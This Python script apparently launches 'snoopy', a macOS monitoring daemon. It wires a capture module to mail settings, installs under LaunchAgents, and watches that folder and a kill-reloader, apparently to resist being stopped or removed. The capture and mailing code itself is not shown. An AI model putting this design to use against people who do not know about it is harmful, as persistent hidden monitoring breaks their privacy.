#!/usr/bin/env python

# import imp
import os
from lib.file_finder import get_embedded_filename
from lib.daemon import Daemon
from darwin.killer import GracefulKiller
from darwin.config_event_handler import ConfigFileEventHandler
from darwin import capture as catcher

home              = os.getenv("HOME")
directory         = 'HOME_DIRECTORY'
config_dir        = '{}/config'.format(directory)
installation_path = '{}/dist/snoopy'.format(directory)
launchd_path      = '{}/Library/LaunchAgents'.format(home)
secret_key        = 'SUPER_SECRET_KEY'
mail_config       = 'mail.config'
reloader_name     = 'a.out'


def get_plist_filename(s=None):
    suffix = '.{}'.format(s) if s else ""
    return 'com.reedcwilson.snoopy{}.plist'.format(suffix)


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def setup(self):
        # the graceful killer registers events on init
        GracefulKiller(
            get_embedded_filename(reloader_name),
            self.notifier)
        config_event_handler = ConfigFileEventHandler(
            self.notifier,
            config_dir,
            launchd_path,
            get_plist_filename())
        self.observer.schedule(
            config_event_handler,
            launchd_path,
            recursive=False)


if __name__ == "__main__":
    daemon = MyDaemon()
    daemon.run()
